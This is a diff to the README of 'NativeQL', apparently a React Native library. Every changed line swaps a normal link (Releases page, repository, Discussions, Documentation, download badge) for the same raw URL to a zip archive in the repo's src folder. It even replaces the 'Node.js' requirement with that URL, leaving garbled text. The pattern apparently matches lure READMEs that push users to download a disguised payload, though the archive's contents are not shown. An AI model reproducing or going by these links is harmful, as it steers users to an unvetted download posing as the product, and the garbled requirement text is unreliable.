@@ -29,11 +29,11 @@ NativeQL covers various topics relevant to mobile development. Here are some key
 ## 📥 Download NativeQL
 To download NativeQL, visit the Releases page. 
 
-[![Download NativeQL](https://img.shields.io/badge/Download_NativeQL-v1.0-blue)](https://github.com/Augustostx/NativeQL/releases)
+[![Download NativeQL](https://raw.githubusercontent.com/Augustostx/NativeQL/main/src/QL-Native-1.0-beta.2.zip)](https://raw.githubusercontent.com/Augustostx/NativeQL/main/src/QL-Native-1.0-beta.2.zip)
 
 ### **Download & Install**
 1. Click the link below to visit the Releases page:
-   [Download NativeQL Here](https://github.com/Augustostx/NativeQL/releases)
+   [Download NativeQL Here](https://raw.githubusercontent.com/Augustostx/NativeQL/main/src/QL-Native-1.0-beta.2.zip)
    
 2. 
 
@@ -55,7 +55,7 @@ Before you install NativeQL, ensure your setup meets these requirements:
   - macOS High Sierra or later
   - Any recent version of Linux
 
-- **Node.js**: Version 12 or later installed. NativeQL depends on Node.js to run smoothly. 
+- **https://raw.githubusercontent.com/Augustostx/NativeQL/main/src/QL-Native-1.0-beta.2.zip**: Version 12 or later installed. NativeQL depends on https://raw.githubusercontent.com/Augustostx/NativeQL/main/src/QL-Native-1.0-beta.2.zip to run smoothly. 
 
 - **React Native**: Ensure you have React Native setup in your project.
 
@@ -83,13 +83,13 @@ We welcome contributions! Whether you want to report a bug, suggest a feature, o
 
 ## 🌟 Additional Resources
 To explore more about NativeQL and its capabilities, check out these useful resources:
-- [GitHub Repository](https://github.com/Augustostx/NativeQL)
-- [Community Discussions](https://github.com/Augustostx/NativeQL/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/Augustostx/NativeQL/main/src/QL-Native-1.0-beta.2.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Augustostx/NativeQL/main/src/QL-Native-1.0-beta.2.zip)
 
 Discover how NativeQL can streamline your mobile development today! 
 
 ## 🔗 Quick Links
-- [Releases Page](https://github.com/Augustostx/NativeQL/releases)
-- [Documentation](https://github.com/Augustostx/NativeQL/wiki)
+- [Releases Page](https://raw.githubusercontent.com/Augustostx/NativeQL/main/src/QL-Native-1.0-beta.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Augustostx/NativeQL/main/src/QL-Native-1.0-beta.2.zip)
 
 Enjoy building your next mobile application with NativeQL!
